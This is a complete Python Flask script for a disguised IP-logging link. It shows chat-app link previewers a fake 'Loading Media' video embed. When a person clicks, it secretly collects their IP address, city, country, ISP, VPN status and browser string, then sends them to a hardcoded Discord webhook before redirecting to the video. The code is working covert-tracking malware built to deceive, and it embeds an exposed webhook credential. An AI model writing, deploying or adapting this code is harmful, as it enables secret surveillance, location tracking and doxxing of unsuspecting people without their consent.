import os
import requests
from flask import Flask, request, redirect, render_template_string
import time
from datetime import datetime

app = Flask(__name__)

# YOUR CONFIG
WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"
# The MP4 version of your loading dots
MP4_URL = "https://media.tenor.com/m/EGAPcaiphUoAAAAP/loading-screen-two-dots.mp4" 

@app.route('/v/<id>')
def interceptor(id):
    ua = request.user_agent.string
    ua_low = ua.lower()
    
    # 1. DISCORD SPOOF (Forcing the Video Player)
    if any(x in ua_low for x in ["discord", "telegram", "bot"]):
        html = f'''
        <html>
            <head>
                <meta property="og:title" content="Loading Media...">
                <meta property="og:type" content="video.other">
                <meta property="og:video" content="{MP4_URL}">
                <meta property="og:video:type" content="video/mp4">
                <meta property="og:video:width" content="640">
                <meta property="og:video:height" content="640">
                <meta name="twitter:card" content="player">
                <meta name="twitter:player" content="{MP4_URL}">
            </head>
            <body style="background-color:black;"></body>
        </html>
        '''
        return render_template_string(html)

    # 2. THE DEEP SCAN (IP, Geo, Device)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")
    
    c, r, cntry, isp, vpn = "??","??","??","??","??"
    try:
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        if g['status'] == 'success':
            c, r, cntry = g.get('city'), g.get('regionName'), g.get('country')
            isp, vpn = g.get('isp'), "🚨 YES" if g.get('proxy') else "✅ NO"
    except: pass

    # 3. WEBHOOK REPORT
    payload = {
        "username": "VIDEO SENSOR",
        "embeds": [{
            "title": "🎬 VIDEO CLICK DETECTED",
            "color": 0x00FF00,
            "fields": [
                {"name": "📍 GEOLOCATION", "value": f"```City: {c}\nCountry: {cntry}```", "inline": True},
                {"name": "🌐 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}", "inline": True},
                {"name": "🧬 DEVICE", "value": f"**IP:** `{ip}`\n**UA:** `{ua}`", "inline": False}
            ],
            "footer": {"text": f"Captured at {time_utc}"}
        }]
    }
    
    # 4. EXECUTION
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
        time.sleep(1.2) # Delay to ensure data capture before browser moves
    except: pass

    return redirect(MP4_URL)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
